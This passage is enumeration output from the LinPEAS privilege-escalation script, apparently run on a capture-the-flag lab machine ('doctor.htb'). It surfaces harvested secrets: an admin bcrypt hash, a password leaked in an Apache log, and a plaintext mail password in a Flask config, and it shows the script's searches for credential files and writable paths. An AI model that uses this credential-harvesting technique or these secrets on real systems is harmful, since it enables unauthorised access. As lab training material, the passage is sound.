+-rw-r--r-- 1 root root 1059 Mär 27  2020 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
+-rw-r--r-- 1 root root 840 Mär 27  2020 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page
+-rw-r--r-- 1 root root 475 Mär 10  2020 /usr/share/tracker/tracker-backup.xml
+-rw-r--r-- 1 root root 673 Apr 23  2020 /etc/xml/xml-core.xml.old
+-rw-r--r-- 1 root root 10151 Apr 23  2020 /etc/xml/docbook-xml.xml.old
+-rw-r--r-- 1 root root 3210 Apr 23  2020 /etc/xml/catalog.old
+-rw-r--r-- 1 root root 1219 Apr 23  2020 /etc/xml/sgml-data.xml.old
+-rwxr-xr-x 1 root root 6785 Apr 24  2018 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/luckybackup_luckybackup.png
+-rwxr-xr-x 1 root root 6035 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/slbackup-php_web-browser.png
+-rwxr-xr-x 1 root root 2168 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/kup-backup_kup.png
+-rwxr-xr-x 1 root root 5509 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/kbackup_kbackup.png
+-rwxr-xr-x 1 root root 3983 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/slbackup-php_web-browser.png
+-rwxr-xr-x 1 root root 1665 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/kup-backup_kup.png
+-rwxr-xr-x 1 root root 4189 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/kbackup_kbackup.png
+-rw-r--r-- 1 root root 191 Apr 23  2020 /var/lib/sgml-base/supercatalog.old
+-rw-r----- 1 root adm 21578 Sep 17 16:23 /var/log/apache2/backup
+-rw-r--r-- 1 root root 22947 Sep  6 17:09 /var/log/Xorg.0.log.old
+
+[+] Searching tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
+
+ -> Extracting tables from /var/lib/colord/storage.db (limit 20)
+
+ -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
+
+ -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
+
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
+
+ -> Extracting tables from /home/shaun/.cache/tracker/meta.db (limit 20)
+  --> Found interesting column names in nco:Role_nco:hasEmailAddress (output limit 10)
+CREATE TABLE "nco:Role_nco:hasEmailAddress" (ID INTEGER NOT NULL, "nco:hasEmailAddress" INTEGER NOT NULL, "nco:hasEmailAddress:graph" INTEGER)
+  --> Found interesting column names in nco:EmailAddress (output limit 10)
+CREATE TABLE "nco:EmailAddress" (ID INTEGER NOT NULL PRIMARY KEY, "nco:emailAddress" TEXT COLLATE TRACKER UNIQUE, "nco:emailAddress:graph" INTEGER)
+  --> Found interesting column names in nco:VoicePhoneNumber (output limit 10)
+CREATE TABLE "nco:VoicePhoneNumber" (ID INTEGER NOT NULL PRIMARY KEY, "nco:voiceMail" INTEGER, "nco:voiceMail:graph" INTEGER)
+  --> Found interesting column names in nfo:FileDataObject (output limit 10)
+CREATE TABLE "nfo:FileDataObject" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:fileLastAccessed" INTEGER, "nfo:fileLastAccessed:graph" INTEGER, "nfo:fileLastAccessed:localDate" INTEGER, "nfo:fileLastAccessed:localTime" INTEGER, "nfo:fileCreated" INTEGER, "nfo:fileCreated:graph" INTEGER, "nfo:fileCreated:localDate" INTEGER, "nfo:fileCreated:localTime" INTEGER, "nfo:fileSize" INTEGER, "nfo:fileSize:graph" INTEGER, "nfo:permissions" TEXT COLLATE TRACKER, "nfo:permissions:graph" INTEGER, "nfo:fileName" TEXT COLLATE TRACKER, "nfo:fileName:graph" INTEGER, "nfo:hasHash" INTEGER, "nfo:hasHash:graph" INTEGER, "nfo:fileOwner" INTEGER, "nfo:fileOwner:graph" INTEGER, "nfo:fileLastModified" INTEGER, "nfo:fileLastModified:graph" INTEGER, "nfo:fileLastModified:localDate" INTEGER, "nfo:fileLastModified:localTime" INTEGER)
+100003, 1600167255, 100002, 18520, 39255, None, None, None, None, 4096, 100002, None, None, shaun, 100002, None, None, None, None, 1600167110, 100002, 18520, 39110
+  --> Found interesting column names in nfo:FileHash (output limit 10)
+CREATE TABLE "nfo:FileHash" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:hashValue" TEXT COLLATE TRACKER, "nfo:hashValue:graph" INTEGER, "nfo:hashAlgorithm" TEXT COLLATE TRACKER, "nfo:hashAlgorithm:graph" INTEGER)
+  --> Found interesting column names in nfo:ArchiveItem (output limit 10)
+CREATE TABLE "nfo:ArchiveItem" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:isPasswordProtected" INTEGER, "nfo:isPasswordProtected:graph" INTEGER)
+  --> Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)
+CREATE TABLE "nmo:Email_nmo:contentMimeType" (ID INTEGER NOT NULL, "nmo:contentMimeType" TEXT NOT NULL, "nmo:contentMimeType:graph" INTEGER)
+  --> Found interesting column names in nmo:Email (output limit 10)
+CREATE TABLE "nmo:Email" (ID INTEGER NOT NULL PRIMARY KEY, "nmo:hasContent" INTEGER, "nmo:hasContent:graph" INTEGER, "nmo:isFlagged" INTEGER, "nmo:isFlagged:graph" INTEGER, "nmo:isRecent" INTEGER, "nmo:isRecent:graph" INTEGER, "nmo:status" TEXT COLLATE TRACKER, "nmo:status:graph" INTEGER, "nmo:responseType" TEXT COLLATE TRACKER, "nmo:responseType:graph" INTEGER)
+  --> Found interesting column names in ncal:UnionParentClass (output limit 10)
+CREATE TABLE "ncal:UnionParentClass" (ID INTEGER NOT NULL PRIMARY KEY, "ncal:lastModified" INTEGER, "ncal:lastModified:graph" INTEGER, "ncal:lastModified:localDate" INTEGER, "ncal:lastModified:localTime" INTEGER, "ncal:trigger" INTEGER, "ncal:trigger:graph" INTEGER, "ncal:created" INTEGER, "ncal:created:graph" INTEGER, "ncal:created:localDate" INTEGER, "ncal:created:localTime" INTEGER, "ncal:url" INTEGER, "ncal:url:graph" INTEGER, "ncal:comment" TEXT COLLATE TRACKER, "ncal:comment:graph" INTEGER, "ncal:summaryAltRep" INTEGER, "ncal:summaryAltRep:graph" INTEGER, "ncal:priority" INTEGER, "ncal:priority:graph" INTEGER, "ncal:location" TEXT COLLATE TRACKER, "ncal:location:graph" INTEGER, "ncal:uid" TEXT COLLATE TRACKER, "ncal:uid:graph" INTEGER, "ncal:requestStatus" INTEGER, "ncal:requestStatus:graph" INTEGER, "ncal:recurrenceId" INTEGER, "ncal:recurrenceId:graph" INTEGER, "ncal:dtstamp" INTEGER, "ncal:dtstamp:graph" INTEGER, "ncal:dtstamp:localDate" INTEGER, "ncal:dtstamp:localTime" INTEGER, "ncal:class" INTEGER, "ncal:class:graph" INTEGER, "ncal:organizer" INTEGER, "ncal:organizer:graph" INTEGER, "ncal:dtend" INTEGER, "ncal:dtend:graph" INTEGER, "ncal:summary" TEXT COLLATE TRACKER, "ncal:summary:graph" INTEGER, "ncal:descriptionAltRep" INTEGER, "ncal:descriptionAltRep:graph" INTEGER, "ncal:commentAltRep" INTEGER, "ncal:commentAltRep:graph" INTEGER, "ncal:sequence" INTEGER, "ncal:sequence:graph" INTEGER, "ncal:contact" TEXT COLLATE TRACKER, "ncal:contact:graph" INTEGER, "ncal:contactAltRep" INTEGER, "ncal:contactAltRep:graph" INTEGER, "ncal:locationAltRep" INTEGER, "ncal:locationAltRep:graph" INTEGER, "ncal:geo" INTEGER, "ncal:geo:graph" INTEGER, "ncal:resourcesAltRep" INTEGER, "ncal:resourcesAltRep:graph" INTEGER, "ncal:dtstart" INTEGER, "ncal:dtstart:graph" INTEGER, "ncal:description" TEXT COLLATE TRACKER, "ncal:description:graph" INTEGER, "ncal:relatedToSibling" TEXT COLLATE TRACKER, "ncal:relatedToSibling:graph" INTEGER, "ncal:duration" INTEGER, "ncal:duration:graph" INTEGER)
+  --> Found interesting column names in fts5 (output limit 10)
+CREATE VIRTUAL TABLE fts5 USING fts5(content="fts_view", "nco:phoneNumber", "nfo:fontFamily", "nmm:artistName", "nfo:tableOfContents", "nfo:fileName", "nmo:messageSubject", "nfo:genre", "nmm:genre", "mtp:creator", "nco:title", "nco:emailAddress", "nie:keyword", "nmm:category", "nid3:title", "nid3:albumTitle", "nid3:contentType", "nco:nameFamily", "nco:nameGiven", "nco:nameAdditional", "nco:contactGroupName", "nco:fullname", "nco:nickname", "nco:region", "nco:country", "nco:extendedAddress", "nco:streetAddress", "nco:postalcode", "nco:locality", "nco:county", "nco:district", "nco:pobox", "nco:imID", "nco:imNickname", "ncal:comment", "ncal:location", "ncal:summary", "ncal:contact", "ncal:description", "nie:title", "nie:subject", "nie:plainTextContent", "nie:description", "nie:comment", "nao:prefLabel", "nao:description", "nco:department", "nco:role", "nco:note", "nmm:albumTitle", tokenize=TrackerTokenizer)
+
+ -> Extracting tables from /home/web/blog/flaskblog/site.db (limit 20)
+  --> Found interesting column names in user (output limit 10)
+CREATE TABLE user (
+	id INTEGER NOT NULL, 
+	username VARCHAR(20) NOT NULL, 
+	email VARCHAR(120) NOT NULL, 
+	image_file VARCHAR(20) NOT NULL, 
+	password VARCHAR(60) NOT NULL, 
+	PRIMARY KEY (id), 
+	UNIQUE (username), 
+	UNIQUE (email)
+)
+1, admin, admin@doctor.htb, default.gif, $2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
+
+ -> Extracting tables from /home/web/.cache/tracker/meta.db (limit 20)
+  --> Found interesting column names in nco:Role_nco:hasEmailAddress (output limit 10)
+CREATE TABLE "nco:Role_nco:hasEmailAddress" (ID INTEGER NOT NULL, "nco:hasEmailAddress" INTEGER NOT NULL, "nco:hasEmailAddress:graph" INTEGER)
+  --> Found interesting column names in nco:EmailAddress (output limit 10)
+CREATE TABLE "nco:EmailAddress" (ID INTEGER NOT NULL PRIMARY KEY, "nco:emailAddress" TEXT COLLATE TRACKER UNIQUE, "nco:emailAddress:graph" INTEGER)
+  --> Found interesting column names in nco:VoicePhoneNumber (output limit 10)
+CREATE TABLE "nco:VoicePhoneNumber" (ID INTEGER NOT NULL PRIMARY KEY, "nco:voiceMail" INTEGER, "nco:voiceMail:graph" INTEGER)
+  --> Found interesting column names in nfo:FileDataObject (output limit 10)
+CREATE TABLE "nfo:FileDataObject" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:fileLastAccessed" INTEGER, "nfo:fileLastAccessed:graph" INTEGER, "nfo:fileLastAccessed:localDate" INTEGER, "nfo:fileLastAccessed:localTime" INTEGER, "nfo:fileCreated" INTEGER, "nfo:fileCreated:graph" INTEGER, "nfo:fileCreated:localDate" INTEGER, "nfo:fileCreated:localTime" INTEGER, "nfo:fileSize" INTEGER, "nfo:fileSize:graph" INTEGER, "nfo:permissions" TEXT COLLATE TRACKER, "nfo:permissions:graph" INTEGER, "nfo:fileName" TEXT COLLATE TRACKER, "nfo:fileName:graph" INTEGER, "nfo:hasHash" INTEGER, "nfo:hasHash:graph" INTEGER, "nfo:fileOwner" INTEGER, "nfo:fileOwner:graph" INTEGER, "nfo:fileLastModified" INTEGER, "nfo:fileLastModified:graph" INTEGER, "nfo:fileLastModified:localDate" INTEGER, "nfo:fileLastModified:localTime" INTEGER)
+  --> Found interesting column names in nfo:FileHash (output limit 10)
+CREATE TABLE "nfo:FileHash" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:hashValue" TEXT COLLATE TRACKER, "nfo:hashValue:graph" INTEGER, "nfo:hashAlgorithm" TEXT COLLATE TRACKER, "nfo:hashAlgorithm:graph" INTEGER)
+  --> Found interesting column names in nfo:ArchiveItem (output limit 10)
+CREATE TABLE "nfo:ArchiveItem" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:isPasswordProtected" INTEGER, "nfo:isPasswordProtected:graph" INTEGER)
+  --> Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)
+CREATE TABLE "nmo:Email_nmo:contentMimeType" (ID INTEGER NOT NULL, "nmo:contentMimeType" TEXT NOT NULL, "nmo:contentMimeType:graph" INTEGER)
+  --> Found interesting column names in nmo:Email (output limit 10)
+CREATE TABLE "nmo:Email" (ID INTEGER NOT NULL PRIMARY KEY, "nmo:hasContent" INTEGER, "nmo:hasContent:graph" INTEGER, "nmo:isFlagged" INTEGER, "nmo:isFlagged:graph" INTEGER, "nmo:isRecent" INTEGER, "nmo:isRecent:graph" INTEGER, "nmo:status" TEXT COLLATE TRACKER, "nmo:status:graph" INTEGER, "nmo:responseType" TEXT COLLATE TRACKER, "nmo:responseType:graph" INTEGER)
+  --> Found interesting column names in ncal:UnionParentClass (output limit 10)
+CREATE TABLE "ncal:UnionParentClass" (ID INTEGER NOT NULL PRIMARY KEY, "ncal:lastModified" INTEGER, "ncal:lastModified:graph" INTEGER, "ncal:lastModified:localDate" INTEGER, "ncal:lastModified:localTime" INTEGER, "ncal:trigger" INTEGER, "ncal:trigger:graph" INTEGER, "ncal:created" INTEGER, "ncal:created:graph" INTEGER, "ncal:created:localDate" INTEGER, "ncal:created:localTime" INTEGER, "ncal:url" INTEGER, "ncal:url:graph" INTEGER, "ncal:comment" TEXT COLLATE TRACKER, "ncal:comment:graph" INTEGER, "ncal:summaryAltRep" INTEGER, "ncal:summaryAltRep:graph" INTEGER, "ncal:priority" INTEGER, "ncal:priority:graph" INTEGER, "ncal:location" TEXT COLLATE TRACKER, "ncal:location:graph" INTEGER, "ncal:uid" TEXT COLLATE TRACKER, "ncal:uid:graph" INTEGER, "ncal:requestStatus" INTEGER, "ncal:requestStatus:graph" INTEGER, "ncal:recurrenceId" INTEGER, "ncal:recurrenceId:graph" INTEGER, "ncal:dtstamp" INTEGER, "ncal:dtstamp:graph" INTEGER, "ncal:dtstamp:localDate" INTEGER, "ncal:dtstamp:localTime" INTEGER, "ncal:class" INTEGER, "ncal:class:graph" INTEGER, "ncal:organizer" INTEGER, "ncal:organizer:graph" INTEGER, "ncal:dtend" INTEGER, "ncal:dtend:graph" INTEGER, "ncal:summary" TEXT COLLATE TRACKER, "ncal:summary:graph" INTEGER, "ncal:descriptionAltRep" INTEGER, "ncal:descriptionAltRep:graph" INTEGER, "ncal:commentAltRep" INTEGER, "ncal:commentAltRep:graph" INTEGER, "ncal:sequence" INTEGER, "ncal:sequence:graph" INTEGER, "ncal:contact" TEXT COLLATE TRACKER, "ncal:contact:graph" INTEGER, "ncal:contactAltRep" INTEGER, "ncal:contactAltRep:graph" INTEGER, "ncal:locationAltRep" INTEGER, "ncal:locationAltRep:graph" INTEGER, "ncal:geo" INTEGER, "ncal:geo:graph" INTEGER, "ncal:resourcesAltRep" INTEGER, "ncal:resourcesAltRep:graph" INTEGER, "ncal:dtstart" INTEGER, "ncal:dtstart:graph" INTEGER, "ncal:description" TEXT COLLATE TRACKER, "ncal:description:graph" INTEGER, "ncal:relatedToSibling" TEXT COLLATE TRACKER, "ncal:relatedToSibling:graph" INTEGER, "ncal:duration" INTEGER, "ncal:duration:graph" INTEGER)
+  --> Found interesting column names in fts5 (output limit 10)
+CREATE VIRTUAL TABLE fts5 USING fts5(content="fts_view", "nco:phoneNumber", "nfo:fontFamily", "nmm:artistName", "nfo:tableOfContents", "nfo:fileName", "nmo:messageSubject", "nfo:genre", "nmm:genre", "mtp:creator", "nco:title", "nco:emailAddress", "nie:keyword", "nmm:category", "nid3:title", "nid3:albumTitle", "nid3:contentType", "nco:nameFamily", "nco:nameGiven", "nco:nameAdditional", "nco:contactGroupName", "nco:fullname", "nco:nickname", "nco:region", "nco:country", "nco:extendedAddress", "nco:streetAddress", "nco:postalcode", "nco:locality", "nco:county", "nco:district", "nco:pobox", "nco:imID", "nco:imNickname", "ncal:comment", "ncal:location", "ncal:summary", "ncal:contact", "ncal:description", "nie:title", "nie:subject", "nie:plainTextContent", "nie:description", "nie:comment", "nao:prefLabel", "nao:description", "nco:department", "nco:role", "nco:note", "nmm:albumTitle", tokenize=TrackerTokenizer)
+
+
+[+] Web files?(output limit)
+/var/www/:
+total 12K
+drwxr-xr-x  3 root     root 4,0K Jul 20 22:32 .
+drwxr-xr-x 16 root     root 4,0K Jul 21 19:17 ..
+drwxrwxr-x  6 www-data web  4,0K Sep 19 18:59 html
+
+/var/www/html:
+total 144K
+drwxrwxr-x 6 www-data web  4,0K Sep 19 18:59 .
+drwxr-xr-x 3 root     root 4,0K Jul 20 22:32 ..
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 2319 Feb 25  2020 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
+-rw-r--r-- 1 shaun shaun 3771 Sep  6 16:26 /home/shaun/.bashrc
+-rw-r--r-- 1 shaun shaun 807 Sep  6 16:26 /home/shaun/.profile
+lrwxrwxrwx 1 web web 9 Jul 26 14:24 /home/web/.bash_history -> /dev/null
+Searching possible passwords inside /home/web/.bash_history (limit 100)
+
+-rw-r--r-- 1 web web 3771 Jul 20 22:34 /home/web/.bashrc
+-rw------- 1 web web 19 Jul 26 14:02 /home/web/.local/share/nano/search_history
+Searching possible passwords inside /home/web/.local/share/nano/search_history (limit 100)
+
+-rw-r--r-- 1 web web 807 Jul 20 22:34 /home/web/.profile
+-rw-r--r-- 1 root root 3106 Dez  5  2019 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2778 Sep 16  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Sep 16  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/home/web
+/run/lock
+/snap/core18/1705/run/lock
+/snap/core18/1705/tmp
+/snap/core18/1705/var/tmp
+/snap/core18/1880/run/lock
+/snap/core18/1880/tmp
+/snap/core18/1880/var/tmp
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas.sh
+/tmp/linpeas.txt
+/tmp/lse.sh
+/tmp/.Test-unix
+/tmp/VMwareDnD
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/var/crash
+/var/lib/BrlAPI
+/var/lib/php/sessions
+/var/metrics
+/var/tmp
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group web adm:
+
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+    216 /var/log/apache2/access.log:10.10.14.78
+    146 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal:10.10.14.4
+    135 /var/log/apache2/backup:10.10.14.4
+     93 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal:10.10.10.40
+     46 /var/log/auth.log.1:10.10.14.2
+     41 /var/log/syslog.1:10.10.10.209
+     37 /var/log/apache2/access.log.1:10.10.14.2
+     33 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal:10.10.14.2
+     29 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000033c8f-0005afad8045c159.journal:10.10.14.2
+     14 /var/log/wtmp:10.10.14.2
+     14 /var/log/ufw.log.1:10.10.14.2
+     14 /var/log/ufw.log.1:10.10.10.209
+     14 /var/log/syslog.1:10.10.14.2
+     14 /var/log/kern.log.1:10.10.14.2
+     14 /var/log/kern.log.1:10.10.10.209
+     11 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000033c8f-0005afad8045c159.journal:10.10.10.209
+     11 /var/log/apache2/access.log.1:10.10.10.209
+      9 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal:10.10.14.2
+      7 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000033c8f-0005afad8045c159.journal:10.10.10.40
+      5 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000033c8f-0005afad8045c159.journal:10.10.14.3
+      4 /var/log/wtmp:10.10.14.4
+      4 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal:10.10.110.100
+      3 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal:10.10.110.100
+      3 /var/log/auth.log.1:10.10.14.3
+      2 /var/log/wtmp:192.168.127.142
+      2 /var/log/ufw.log.1:10.10.14.3
+      2 /var/log/ufw.log.1:10.10.10.40
+      2 /var/log/lastlog:10.10.14.2
+      2 /var/log/kern.log.1:10.10.14.3
+      2 /var/log/kern.log.1:10.10.10.40
+      2 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1002@d7db22ad6f3940688b22b65437aa9641-0000000000054339-0005afadb413b4f9.journal:10.10.14.2
+      2 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal:10.10.10.209
+      2 /var/log/apache2/error.log.1:10.10.14.2
+      2 /var/log/apache2/error.log:10.10.14.78
+      2 /var/log/apache2/backup:10.10.10.40
+      1 /var/log/wtmp:10.10.14.3
+      1 /var/log/lastlog:192.168.127.142
+      1 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal:91.189.94.4
+      1 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal:91.189.91.157
+      1 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal:91.189.89.199
+      1 /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal:192.168.127.193
+
+[+] Finding passwords inside logs (limit 70)
+Binary file /var/log/apache2/access.log.12.gz matches
+Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
+Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
+Binary file /var/log/kern.log.2.gz matches
+Binary file /var/log/kern.log.4.gz matches
+Binary file /var/log/syslog.4.gz matches
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+/var/log/auth.log.1:Sep 23 15:38:45 doctor sudo:    shaun : command not allowed ; TTY=tty1 ; PWD=/home/shaun ; USER=root ; COMMAND=list
+/var/log/auth.log.1:Sep 28 13:31:10 doctor sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/setcap -r /usr/bin/python3/
+/var/log/auth.log:Nov 27 07:35:34 doctor VGAuth[681]: message repeated 2 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
+/var/log/auth.log:Nov 27 07:35:34 doctor VGAuth[681]: vmtoolsd: Username and password successfully validated for 'root'.
+/var/log/auth.log:Nov 27 07:35:40 doctor VGAuth[681]: vmtoolsd: Username and password successfully validated for 'root'.
+/var/log/auth.log:Nov 27 07:35:50 doctor VGAuth[681]: message repeated 20 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
+/var/log/auth.log:Nov 27 08:27:10 doctor sudo: pam_unix(sudo:auth): auth could not identify password for [web]
+/var/log/auth.log:Nov 27 08:27:10 doctor sudo:      web : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
+/var/log/auth.log:Nov 27 08:29:50 doctor sudo: pam_unix(sudo:auth): auth could not identify password for [web]
+/var/log/auth.log:Nov 27 08:29:50 doctor sudo:      web : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
+/var/log/dmesg.0:[    5.666833] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/dmesg:[    3.592812] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/dmesg:[    4.180249] systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/dmesg:[    4.180340] systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Nov 27 07:35:25 doctor kernel: [    3.592812] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Nov 27 07:35:25 doctor kernel: [    4.180340] systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 12:39:50 doctor kernel: [    4.498424] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 12:39:50 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/syslog.1:Sep 28 12:39:50 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 13:08:45 doctor kernel: [    4.689181] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 13:08:46 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/syslog.1:Sep 28 13:08:46 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 13:18:58 doctor kernel: [    4.853998] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 13:18:58 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/syslog.1:Sep 28 13:18:58 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 13:22:49 doctor kernel: [    5.138817] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 13:22:49 doctor kernel: [    5.531341] systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 13:38:11 doctor kernel: [    5.238717] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 13:38:11 doctor kernel: [    5.613869] systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 13:41:49 doctor kernel: [    4.871936] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 13:41:49 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/syslog.1:Sep 28 13:41:49 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 13:47:46 doctor kernel: [    4.834021] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 13:47:46 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/syslog.1:Sep 28 13:47:46 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+/var/log/syslog.1:Sep 28 14:59:58 doctor kernel: [    5.666833] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Sep 28 14:59:58 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+/var/log/syslog.1:Sep 28 14:59:58 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+
+[+] Finding emails inside logs (limit 70)
+     18 /var/log/kern.log.1:giometti@linux.it
+     18 /var/log/kern.log.1:dm-devel@redhat.com
+      9 /var/log/syslog.1:giometti@linux.it
+      9 /var/log/syslog.1:dm-devel@redhat.com
+      1 /var/log/dmesg:giometti@linux.it
+      1 /var/log/dmesg:dm-devel@redhat.com
+      1 /var/log/dmesg.0:giometti@linux.it
+      1 /var/log/dmesg.0:dm-devel@redhat.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
+/home/web/blog/flaskblog/config.py:    MAIL_PASSWORD = "doctor"
+/home/web/blog/flaskblog/models.py:    password = db.Column(db.String(60), nullable=False)
+/home/web/blog/flaskblog/templates/login.html:                        {{ form.password(class="form-control form-control-lg") }}
